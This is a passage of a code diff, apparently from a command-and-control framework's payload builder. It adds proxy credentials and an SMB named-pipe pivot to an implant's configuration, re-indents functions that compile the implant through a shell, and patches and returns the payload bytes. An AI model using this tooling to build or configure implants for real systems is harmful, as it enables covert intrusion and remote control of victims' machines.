+			DemonConfig.AddString(common.EncodeUTF16("/"))
+		} else {
+			DemonConfig.AddInt(len(Config.Config.Uris))
+			for _, uri := range Config.Config.Uris {
+				logger.Debug(uri)
+				DemonConfig.AddString(common.EncodeUTF16(uri))
+			}
+		}
 
-    logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))
+		// adding proxy connection info
+		if Config.Config.Proxy.Enabled {
+			DemonConfig.AddInt(win32.TRUE)
+			var ProxyUrl = fmt.Sprintf("%v://%v:%v", Config.Config.Proxy.Type, Config.Config.Proxy.Host, Config.Config.Proxy.Port)
 
-    return DemonConfig.Buffer()
+			DemonConfig.AddString(common.EncodeUTF16(ProxyUrl))
+			DemonConfig.AddString(common.EncodeUTF16(Config.Config.Proxy.Username))
+			DemonConfig.AddString(common.EncodeUTF16(Config.Config.Proxy.Password))
+		} else {
+			DemonConfig.AddInt(win32.FALSE)
+		}
+
+		break
+
+	case handlers.LISTENER_PIVOT_SMB:
+		var Config = b.config.ListenerConfig.(*handlers.SMB)
+
+		DemonConfig.AddString("\\\\.\\pipe\\" + Config.Config.PipeName)
+
+		break
+	}
+
+	logger.Debug("DemonConfig:\n" + hex.Dump(DemonConfig.Buffer()))
+
+	return DemonConfig.Buffer()
 }
 
 func (b *Builder) GetPayloadBytes() []byte {
 
-    if len(b.preBytes) > 0 {
-        b.SendConsoleMessage("Good", "Payload generated")
-        return b.preBytes
-    }
+	if len(b.preBytes) > 0 {
+		b.SendConsoleMessage("Good", "Payload generated")
+		return b.preBytes
+	}
 
-    var (
-        FileBuffer []byte
-        err        error
-    )
+	var (
+		FileBuffer []byte
+		err        error
+	)
 
-    if b.outputPath == "" {
-        logger.Error("Output Path is empty")
-        if !b.silent {
-            b.SendConsoleMessage("Error", "Output Path is empty")
-        }
-        return nil
-    }
+	if b.outputPath == "" {
+		logger.Error("Output Path is empty")
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Output Path is empty")
+		}
+		return nil
+	}
 
-    FileBuffer, err = os.ReadFile(b.outputPath)
-    if err != nil {
-        logger.Error("Couldn't read content of file: " + err.Error())
-        if !b.silent {
-            b.SendConsoleMessage("Error", "Couldn't read content of file: "+err.Error())
-        }
-        return nil
-    }
-    /*  copy(ConfigBytes, Config)
-        for i := range Padding {
-            Padding[i] = 0x05
-        }
+	FileBuffer, err = os.ReadFile(b.outputPath)
+	if err != nil {
+		logger.Error("Couldn't read content of file: " + err.Error())
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Couldn't read content of file: "+err.Error())
+		}
+		return nil
+	}
+	/*  copy(ConfigBytes, Config)
+	    for i := range Padding {
+	        Padding[i] = 0x05
+	    }
 
-        if !b.silent {
-            b.SendConsoleMessage("Info", "Patching implant config")
-        }
+	    if !b.silent {
+	        b.SendConsoleMessage("Info", "Patching implant config")
+	    }
 
-        FileBuffer = bytes.Replace(FileBuffer, Padding, ConfigBytes, 1)
-    */
-    if b.PatchBinary {
-        FileBuffer = b.Patch(FileBuffer)
-    }
+	    FileBuffer = bytes.Replace(FileBuffer, Padding, ConfigBytes, 1)
+	*/
+	if b.PatchBinary {
+		FileBuffer = b.Patch(FileBuffer)
+	}
 
-    if !b.silent {
-        b.SendConsoleMessage("Good", "Payload generated")
-    }
+	if !b.silent {
+		b.SendConsoleMessage("Good", "Payload generated")
+	}
 
-    return FileBuffer
+	return FileBuffer
 }
 
 func (b *Builder) Cmd(cmd string) bool {
-    var (
-        Command = exec.Command("sh", "-c", cmd)
-        stdout  bytes.Buffer
-        stderr  bytes.Buffer
-        err     error
-    )
+	var (
+		Command = exec.Command("sh", "-c", cmd)
+		stdout  bytes.Buffer
+		stderr  bytes.Buffer
+		err     error
+	)
 
-    Command.Dir = b.sourcePath
-    Command.Stdout = &stdout
-    Command.Stderr = &stderr
+	Command.Dir = b.sourcePath
+	Command.Stdout = &stdout
+	Command.Stderr = &stderr
 
-    err = Command.Run()
-    if err != nil {
-        logger.Error("Couldn't compile implant: " + err.Error())
-        if !b.silent {
-            b.SendConsoleMessage("Error", "Couldn't compile implant: "+err.Error())
-            b.SendConsoleMessage("Error", "Compile output: "+stderr.String())
-        }
-        logger.Debug(cmd)
-        logger.Debug("StdErr:\n" + stderr.String())
-        return false
-    }
-    return true
+	err = Command.Run()
+	if err != nil {
+		logger.Error("Couldn't compile implant: " + err.Error())
+		if !b.silent {
+			b.SendConsoleMessage("Error", "Couldn't compile implant: "+err.Error())
+			b.SendConsoleMessage("Error", "Compile output: "+stderr.String())
+		}
+		logger.Debug(cmd)
+		logger.Debug("StdErr:\n" + stderr.String())
+		return false
+	}
+	return true
 }
 
 func (b *Builder) CompileCmd(cmd string) bool {
 
-    if b.Cmd(cmd) {
-        if !b.silent {
-            b.SendConsoleMessage("Info", "Finished compiling source")
-        }
-        return true
-    }
+	if b.Cmd(cmd) {
+		if !b.silent {
+			b.SendConsoleMessage("Info", "Finished compiling source")
+		}
+		return true
+	}
 
-    return false
+	return false
 }
 
 func (b *Builder) GetListenerDefines() []string {
-    var defines []string
+	var defines []string
 
-    switch b.config.ListenerType {
+	switch b.config.ListenerType {
 
-    case handlers.LISTENER_HTTP:
+	case handlers.LISTENER_HTTP:
 
-        defines = append(defines, "TRANSPORT_HTTP")
-        break
+		defines = append(defines, "TRANSPORT_HTTP")
+		break
 
-    case handlers.LISTENER_PIVOT_SMB:
+	case handlers.LISTENER_PIVOT_SMB:
 
-        defines = append(defines, "TRANSPORT_SMB")
-        break
+		defines = append(defines, "TRANSPORT_SMB")
+		break
 
-    }
+	}
 
-    return defines
+	return defines
 }
 
 func (b *Builder) DeletePayload() {
-    if err := os.Remove(b.outputPath); err != nil {
-        logger.Error("Couldn't remove " + b.outputPath + ": " + err.Error())
-    }
+	if err := os.Remove(b.outputPath); err != nil {
+		logger.Error("Couldn't remove " + b.outputPath + ": " + err.Error())
+	}
 }
